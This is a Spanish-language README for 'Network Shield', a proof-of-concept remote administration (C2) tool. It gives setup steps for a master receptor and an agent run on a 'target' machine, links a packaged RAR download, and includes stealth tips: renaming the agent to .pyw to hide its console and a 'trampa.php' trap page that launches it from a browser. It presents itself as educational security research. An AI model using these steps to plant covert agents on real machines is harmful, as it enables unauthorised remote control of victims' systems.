<p align="center">
  <a href="#-requisitos-del-sistema">
    <img src="https://img.shields.io/badge/Network_Shield-Documentación-007bff?style=for-the-badge&logo=opsgenie" alt="Docs">
  </a>
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python-Instalar-ffd343?style=for-the-badge&logo=python&logoColor=black" alt="Python">
  </a>
  <a href="https://github.com/xalexlopez00/Offensive-Research/releases/download/v1.0.0/Network-Shield-System.rar">
    <img src="https://img.shields.io/badge/Descargar-Proyecto_RAR-ffc107?style=for-the-badge&logo=github" alt="Descargar">
  </a>
</p>

# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

**⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos e investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB) instalados y activos.
* **Python 3.x**: Debe estar instalado y configurado correctamente en el PATH del sistema.
* **Librerías**: Es necesario ejecutar `pip install requests` en la terminal antes de iniciar.
* **Base de Datos**: Se debe importar el esquema SQL incluido en el archivo `server/db.txt`.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1. Inicia **Apache** y **MySQL** desde el panel de control de XAMPP.
2. Accede a la administración local en `http://localhost/phpmyadmin`.
3. Crea una nueva base de datos llamada `network_shield_db`.
4. Importa el contenido de `server/db.txt` utilizando la pestaña **SQL**.

---

### 2. Configuración del Servidor Web
1. Mueve la carpeta `Network-Shield-System` a la ruta `C:\xampp\htdocs\`.
2. El panel de administración será accesible en: `http://localhost/Network-Shield-System/server/index.php`.

---

## 📡 Ejecución y Pruebas

Sigue este orden estricto para establecer el enlace entre los componentes:

### 🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta `master/` y lanza el centro de control:
`python receptor.py`

---

### 🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:
* **Modo Manual**: `python client/agente.py`
* **Modo Invisible**: Renombra el archivo a `agente.pyw` y ejecútalo para ocultar la consola.
* **Simulación Web**: Accede mediante el navegador a `http://localhost/Network-Shield-System/server/trampa.php`.

---

## 🔐 Integridad y Seguridad (Hash)

Para verificar que el archivo descargado es original y no ha sido alterado, comprueba su firma digital:

> **SHA-256:** `4f6726f2d914f147ab8ce4a94693cd5c6f23f880cc4f29b363703a091a460552`

---

## 🛠️ Solución de Problemas (Troubleshooting)

* **❌ Error "Windows no puede encontrar el archivo python"**: Este error ocurre cuando el servidor web no tiene acceso al comando global. Asegúrate de que Python esté en las variables de entorno o edita `trampa.php` indicando la ruta absoluta (Ej: `C:\Python39\python.exe`).
* **🌐 ¿No conecta?**: Verifica que el puerto **4444** esté abierto y permitido en el Firewall de Windows.
* **🗄️ ¿Error de SQL?**: Asegúrate de que el usuario de MySQL sea `root` y que no tenga ninguna contraseña configurada.

---
<p align="center">Desarrollado para fines de aprendizaje en Ciberseguridad 🛡️</p>
